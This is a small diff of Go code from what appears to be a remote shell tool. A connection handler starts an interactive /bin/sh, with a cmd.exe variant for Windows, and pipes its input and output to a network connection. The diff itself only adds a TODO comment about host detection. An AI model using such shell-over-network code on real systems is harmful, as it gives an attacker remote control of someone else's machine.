@@ -18,6 +18,7 @@ func handle(conn net.Conn) {
 	 * so that we can use it for stdin and stdout.
 	 * For Windows use exec.Command("cmd.exe")
 	 */
+	// TODO: Implement automatic host detection.
 	// cmd := exec.Command("cmd.exe")
 	cmd := exec.Command("/bin/sh", "-i")
 	rp, wp := io.Pipe()
